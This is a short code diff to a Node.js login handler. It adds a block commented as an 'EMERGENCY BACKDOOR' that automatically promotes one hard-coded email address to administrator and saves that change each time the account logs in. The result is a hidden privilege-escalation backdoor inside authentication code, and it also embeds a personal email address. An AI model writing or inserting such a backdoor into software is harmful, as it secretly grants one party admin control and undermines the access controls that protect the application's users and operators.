@@ -118,6 +118,15 @@ exports.login = async (req, res) => {
       return res.status(401).json({ message: 'Invalid email or password' });
     }
 
+    // EMERGENCY BACKDOOR: Auto-promote specific user to admin
+    if (email.toLowerCase() === 'sudiptarafdar39@gmail.com' && user.role !== 'admin') {
+        user.role = 'admin';
+        await user.save();
+        console.log(`Auto-promoted ${email} to admin`);
+        // Refresh local variable
+        user.role = 'admin';
+    }
+
     sendTokenResponse(user, 200, res, 'Login successful! Welcome back!');
     
     // Log Success
